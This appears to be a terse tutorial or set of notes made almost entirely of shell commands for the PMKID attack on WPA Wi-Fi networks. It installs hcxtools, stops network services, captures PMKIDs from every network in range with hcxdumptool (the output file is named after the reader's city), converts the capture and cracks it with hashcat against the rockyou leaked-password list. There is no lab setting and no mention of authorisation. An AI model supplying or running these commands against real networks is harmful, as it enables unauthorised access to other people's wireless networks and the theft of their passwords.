
``` 
sudo apt-get update
sudo apt-get install libpcap-dev libcurl4-openssl-dev libssl-dev
sudo apt install hcxtools
cd Desktop/
airmon-ng check kill
hcxdumptool -o yourcityname.pcapng -i wlan0 --enable_status 1
hcxpcaptool -E essidlist -I identitylist -U usernamelist -z yourcitynameoutputs.16800 yourcityname.pcapng
``` 
``` 
sudo apt-get update
sudo apt-get install libpcap-dev libcurl4-openssl-dev libssl-dev
sudo apt install hcxtools
``` 
``` 
cd Desktop/
airmon-ng check kill
hcxdumptool -o yourcityname.pcapng -i wlan0 --enable_status 1
``` 
##### Once you have collected some PMKIDs, you can press CTRL+C on your keyboard. 
#### *The next step is to convert the output.*

``` 
hcxpcaptool -E essidlist -I identitylist -U usernamelist -z yourcitynameoutputs.16800 yourcityname.pcapng
```

hashcat -m 16800 yourcitynameoutputs.16800 -a 0  --kernel-accel=1 -w4 --force /home/kali/github/SecLists/Passwords/Leaked-Databases/rockyou.txt 
